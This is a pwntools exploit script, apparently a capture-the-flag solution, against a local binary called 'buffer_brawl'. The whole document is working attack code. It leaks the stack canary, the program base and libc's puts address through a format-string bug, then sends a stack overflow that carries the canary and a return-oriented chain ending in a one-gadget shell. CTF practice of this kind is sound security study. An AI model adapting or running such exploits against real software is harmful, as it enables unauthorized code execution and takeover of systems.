from pwn import *
exe = context.binary = ELF("buffer_brawl", checksec=False)
libc = exe.libc
p = process(exe.path)

def stack_leak(payload) -> bytes:
    p.sendline(b"4")
    p.sendlineafter(b"Right or left?\n", payload)
    return p.recvline()

def leak_got(symbol) -> int:
    addr = stack_leak(b"%7$s".ljust(8, b"_") + p64(exe.got[symbol]))
    addr = u64(addr[:6] + b"\x00\x00")
    return addr

canary, exe_leak = stack_leak(b"%11$p %13$p").split()
canary = int(canary, 16)
exe_leak = int(exe_leak, 16)
exe.address = exe_leak - 0x1747
puts_addr = leak_got("puts")
libc.address = puts_addr - libc.sym.puts

p.info(f"{puts_addr = :x}")
p.info(f"{canary = :x}")
p.info(f"{exe.address = :x}")
p.info(f"{libc.address = :x}")

for i in range(29):
    p.sendlineafter(b"\n> ", b"3")

pop_rbp = exe.address + 0x11b3  # pop rbp; ret;
bss = exe.address + 0x4100      # any writable address
exec = libc.address + 0xebd43   # one-gadget
payload = b'A'*24+p64(canary)+b'B'*8 + flat([pop_rbp, bss, pop_rbp, bss, exec])
p.sendline(payload)
p.interactive()